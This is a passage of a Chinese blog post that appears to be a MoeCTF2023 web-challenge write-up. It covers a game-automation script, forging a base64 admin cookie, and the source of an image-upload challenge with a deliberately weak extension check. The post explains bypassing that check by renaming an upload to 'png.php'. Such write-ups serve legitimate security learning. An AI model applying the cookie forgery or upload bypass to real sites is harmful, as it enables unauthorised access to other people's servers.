<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.7.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.7.0" type="image/png" sizes="32x32"><meta name="description" content="11111111">
<meta property="og:type" content="article">
<meta property="og:title" content="MoeCTF2023">
<meta property="og:url" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/index.html">
<meta property="og:site_name" content="hey&#39;s blog">
<meta property="og:description" content="11111111">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/1.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/2.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/3.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/4.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/5.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/6.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/7.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/8.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/9.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/10.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/11.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/12.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/13.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/14.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/15.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/16.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/17.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/18.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/19.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/20.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/21.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/62.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/63.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/64.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/65.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/66.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/58.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/57.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/22.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/23.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/24.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/25.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/26.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/1.jpg">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/31.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/32.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/33.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/34.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/35.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/59.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/60.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/61.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/27.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/28.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/29.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/30.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/36.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/37.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/38.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/39.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/40.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/41.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/42.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/43.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/44.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/45.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/46.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/47.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/48.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/49.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/50.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/51.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/52.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/53.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/54.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/55.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/56.png">
<meta property="article:published_time" content="2023-08-18T15:42:24.000Z">
<meta property="article:modified_time" content="2023-10-05T01:22:48.625Z">
<meta property="article:author" content="hey">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hyggevv.github.io/2023/08/18/MoeCTF2023/1.png"><title>MoeCTF2023 | hey's blog</title><link ref="canonical" href="https://hyggevv.github.io/2023/08/18/MoeCTF2023/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"複製","copySuccess":"複製成功","copyError":"複製失敗"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首頁</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">歸檔</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分類</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">標籤</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">關於</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/read/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">menu.read</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">hey's blog</div><div class="header-banner-info__subtitle">天气转晴太阳崭新我在前进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">MoeCTF2023</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">發表於</span><span class="post-meta-item__value">2023-08-18</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新於</span><span class="post-meta-item__value">2023-10-05</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">閱讀次數</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
        <h1 id="WEB">
          <a href="#WEB" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1>
      
        <h2 id="http">
          <a href="#http" class="heading-link"><i class="fas fa-link"></i></a><a href="#http" class="headerlink" title="http"></a>http</h2>
      <p><img src="/2023/08/18/MoeCTF2023/1.png"></p>

        <h2 id="Web入门指北">
          <a href="#Web入门指北" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web入门指北" class="headerlink" title="Web入门指北"></a>Web入门指北</h2>
      <p><img src="/2023/08/18/MoeCTF2023/2.png"></p>

        <h2 id="彼岸的flag">
          <a href="#彼岸的flag" class="heading-link"><i class="fas fa-link"></i></a><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h2>
      <p><img src="/2023/08/18/MoeCTF2023/3.png"></p>

        <h2 id="gas-gas-gas">
          <a href="#gas-gas-gas" class="heading-link"><i class="fas fa-link"></i></a><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h2>
      <p>此时题目要求我们在0.5秒内做出正确的反应并且完成其指定的目标，这个时候我们可以看看前端，看看源码，但是此时都没有发现前端或者源码中泄露了flag，那么此时我们继续思考能否通过修改前端的值来加长我们的反应时间，很可惜依旧没有找到这个功能的计算函数，那么此时我们只能老老实实的按照游戏的玩法，此时我们可以让chagpt写一个脚本，通过脚本让程序来识别方向和速度，让其读取html中的关键字进而做出相对应的操作那么即可完成题目的要求</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&#x27;http://localhost:60953/&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line">req_post = s.post(</span><br><span class="line">    url=url,</span><br><span class="line">    data=<span class="string">&#x27;driver=hey&amp;steering_control=0&amp;throttle=2&#x27;</span>,</span><br><span class="line">    headers=headers)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;cookies = <span class="subst">&#123;s.cookies&#125;</span>&#x27;</span>)</span><br><span class="line">post_data = <span class="string">&#x27;driver=hey&amp;steering_control=0&amp;throttle=2&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(re.findall(<span class="string">r&#x27;&lt;h3&gt;&lt;font color=&quot;red&quot;&gt;(.*)&lt;/font&gt;&lt;/h3&gt;&lt;/div&gt;&#x27;</span>,req_post.text)[<span class="number">0</span>])</span><br><span class="line">req = req_post.text</span><br><span class="line">steering_control = <span class="number">0</span></span><br><span class="line">throttle = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;弯道向左&#x27;</span> <span class="keyword">in</span> req_post.text:</span><br><span class="line">        steering_control = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;弯道向右&#x27;</span> <span class="keyword">in</span> req_post.text:</span><br><span class="line">        steering_control = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;弯道直行&#x27;</span> <span class="keyword">in</span> req_post.text:</span><br><span class="line">        steering_control = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;保持这个速度&#x27;</span> <span class="keyword">in</span> req_post.text:</span><br><span class="line">        throttle = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;抓地力太大了&#x27;</span> <span class="keyword">in</span> req_post.text:</span><br><span class="line">        throttle = <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;抓地力太小了&#x27;</span> <span class="keyword">in</span> req_post.text:</span><br><span class="line">        throttle = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;steering_control =&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;throttle =&#125;</span>&#x27;</span>)</span><br><span class="line">    req_post = s.post(</span><br><span class="line">        url=url,</span><br><span class="line">        data=<span class="string">f&#x27;driver=hey&amp;steering_control=<span class="subst">&#123;steering_control&#125;</span>&amp;throttle=<span class="subst">&#123;throttle&#125;</span>&#x27;</span>,</span><br><span class="line">        headers=headers</span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(req_post.text)</span><br><span class="line">    <span class="built_in">print</span>(re.findall(<span class="string">r&#x27;&lt;h3&gt;&lt;font color=&quot;red&quot;&gt;(.*)&lt;/font&gt;&lt;/h3&gt;&lt;/div&gt;&#x27;</span>,req_post.text)[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;cookies = <span class="subst">&#123;s.cookies&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/08/18/MoeCTF2023/4.png"></p>

        <h2 id="Cookie">
          <a href="#Cookie" class="heading-link"><i class="fas fa-link"></i></a><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2>
      <p>此时可以根据readme进行一个注册和登入，登入之后当我们要获取flag时提醒我们不是admin<br><img src="/2023/08/18/MoeCTF2023/5.png"><br>此时我们关注到这个题目的名称为Cookie，此时我们把重心放到这个cookie的内容中，此时我们发现这个token是base64编码而成的<br><img src="/2023/08/18/MoeCTF2023/6.png"><br>那么此时我们就可以伪造一个amdin的token进行登入，有了这个admin的token我们就相当于拥有了令牌<br><img src="/2023/08/18/MoeCTF2023/7.png"></p>

        <h2 id="moe图床">
          <a href="#moe图床" class="heading-link"><i class="fas fa-link"></i></a><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h2>
      
        <h3 id="js代码审计">
          <a href="#js代码审计" class="heading-link"><i class="fas fa-link"></i></a><a href="#js代码审计" class="headerlink" title="js代码审计"></a>js代码审计</h3>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">uploadFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> fileInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fileInput&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> file = fileInput.<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;请选择一个文件进行上传！&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> allowedExtensions = [<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line">    <span class="keyword">const</span> fileExtension = file.<span class="property">name</span>.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="title function_">pop</span>().<span class="title function_">toLowerCase</span>();</span><br><span class="line">    <span class="keyword">if</span> (!allowedExtensions.<span class="title function_">includes</span>(fileExtension)) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;只允许上传后缀名为png的文件！&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">    formData.<span class="title function_">append</span>(<span class="string">&#x27;file&#x27;</span>, file);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;upload.php&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">body</span>: formData</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">json</span>())</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (result.<span class="property">success</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> uploadResult = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;uploadResult&#x27;</span>);</span><br><span class="line">            <span class="keyword">const</span> para = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">            para.<span class="property">textContent</span> = (<span class="string">&#x27;地址：&#x27;</span>);</span><br><span class="line">            <span class="keyword">const</span> link = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            link.<span class="property">textContent</span> = result.<span class="property">file_path</span>;</span><br><span class="line">            link.<span class="property">href</span> = result.<span class="property">file_path</span>;</span><br><span class="line">            link.<span class="property">target</span> = <span class="string">&#x27;_blank&#x27;</span>;</span><br><span class="line">            para.<span class="title function_">append</span>(link);</span><br><span class="line">            uploadResult.<span class="title function_">appendChild</span>(para);</span><br><span class="line"></span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;文件上传成功！&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;文件上传失败：&#x27;</span> + result.<span class="property">message</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;文件上传失败:&#x27;</span>, error);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>此时前端的这个代码是规定我们只能传输png后缀的图片，然后传到后端与upload.php进行匹配<br><img src="/2023/08/18/MoeCTF2023/8.png"><br>此时我们尝试能否获取到upload.php；此时我们通过post的方式来提交一个空数据并且访问upload.php<br><img src="/2023/08/18/MoeCTF2023/9.png"></p>

        <h3 id="php代码审计">
          <a href="#php代码审计" class="heading-link"><i class="fas fa-link"></i></a><a href="#php代码审计" class="headerlink" title="php代码审计"></a>php代码审计</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$targetDir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line"><span class="variable">$allowedExtensions</span> = [<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmp_path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>] !== <span class="string">&#x27;image/png&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件类型不符合要求&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">filesize</span>(<span class="variable">$tmp_path</span>) &gt; <span class="number">512</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件太大&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fileName</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$fileNameParts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$fileNameParts</span>) &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable">$secondSegment</span> = <span class="variable">$fileNameParts</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$secondSegment</span> !== <span class="string">&#x27;png&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$uploadFilePath</span> = <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$targetDir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_path</span>, <span class="variable">$uploadFilePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;file_path&#x27;</span> =&gt; <span class="variable">$uploadFilePath</span>]));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件上传失败&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
<p>此时我们将注意力集中在下面这段代码里面<br><img src="/2023/08/18/MoeCTF2023/10.png"><br>此时它是通过.来将文件名分割在一个数组里面，然后判断这个数组的第二个元素值是否为png，是的话就通过检测，并不判断数组中处第二个元素之后的其他元素值，那么此时我们的绕过思路就可以先传一张png图片，然后使用burpsuite将请求包拦截下来之后，我们修改这个png为png.php；那么此时这就是一个php文件，并且该文件名的被截取之后在数组中的第二个元素恰好为png可以通过检测</p>

        <h3 id="文件上传">
          <a href="#文件上传" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3>
      <p><img src="/2023/08/18/MoeCTF2023/11.png"><br><img src="/2023/08/18/MoeCTF2023/12.png"></p>

        <h2 id="了解你的座驾">
